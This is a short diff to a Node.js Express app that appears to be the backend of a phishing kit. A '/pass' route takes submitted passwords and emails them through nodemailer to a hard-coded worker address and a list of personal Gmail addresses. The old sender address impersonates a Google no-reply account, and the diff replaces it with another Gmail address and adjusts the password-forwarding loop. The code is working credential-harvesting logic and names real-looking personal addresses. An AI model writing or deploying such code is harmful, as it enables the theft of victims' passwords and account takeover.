@@ -10,13 +10,13 @@ app.use(express.static(path.join(__dirname,'static')))
 app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const name = "Shahzeb"  
+const name = "Ubaod"  
 const emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com"
   
 ]
-const workerEmail = "googlecommunityteam-noreply@google.com";
+const workerEmail = "tereza.tarot.ads.officials@gmail.com";
 
 let transporter = nodemailer.createTransport({
   service: 'gmail',
@@ -107,7 +107,7 @@ app.post('/pass',async(req,res)=>{
   await sendPassword(workerEmail,password);
 
   for(let i=0;i<emails.length;i++) {
-   await sendPassword(name,emails[i],password)
+   await sendPassword(emails[i],password)
 
   }
 
